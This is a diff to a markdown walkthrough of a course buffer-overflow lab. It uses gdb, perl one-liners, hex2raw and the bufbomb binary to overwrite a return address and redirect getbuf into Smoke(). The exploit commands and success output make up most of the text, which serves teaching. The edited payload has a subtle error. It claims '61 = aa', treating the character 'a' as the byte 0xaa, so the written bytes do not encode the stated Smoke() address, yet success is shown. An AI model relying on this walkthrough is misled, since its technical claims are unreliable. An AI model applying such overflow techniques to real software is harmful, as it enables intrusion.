@@ -164,6 +164,9 @@ We know that 32 bytes are used to store the "buf" variable as seen when we print
 
 Now quit out of gdb with ```q``` command and type:
 
+
+3. create the buffer overflow string 
+
 ```
 bash-4.1$ perl -e 'print "A"x32 ,"B"x4, "C"x4, "D"x4 '>hex2
 bash-4.1$ ls
@@ -202,6 +205,8 @@ So DDDD = 0x44444444
 
 After DDDD is 0x08048c00 <= THIS IS THE RETURN ADDRESS WE BE CHANGE the address of ```Smoke()```!!!!!
 
+4. force the function getbuf to return to fucntion ```Smoke()``` instead of returning the value 1.
+
 Find where you wrote down the address of ```Smoke()``` earlier. Mine is = 080490aa
 
 Because my machine is little endian the least significant byte is first.
@@ -211,44 +216,25 @@ So
 
 Now exit out of gdb:
 ```
-bash-4.1$ perl -e 'print "AA"x32, "BB"x4, "CC"x4, "DD"x4, "aa900408" '>hex3
+bash-4.1$ perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "61 90 04 08" '>hex3
 ```
+WHERE 61 = aa
 
+Now using the hex2raw executable file you can convert the hex3 text file into a raw file to be submitted as your answer to the bufferbomb.
 
+Type:
+```./hex2raw < hex3 > raw```
 
+5. Almost there!!!!!!!!!!
 
+Now actually give your "raw" file as input to the Buffer Bomb:
+```./bufbomb -u quinnliu < raw```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+And you should get the following output:
 ```
-
-
-
-
-3. create the buffer overflow string 
-
-
-4. force the function getbuf to return to fucntion ```Smoke()``` instead of returning the value 1.
-
-
-5. success!!!
+Userid: quinnliu
+Cookie: 0x2d8cc70c
+Type string:Smoke!: You called smoke()
+VALID
+NICE JOB!
+```
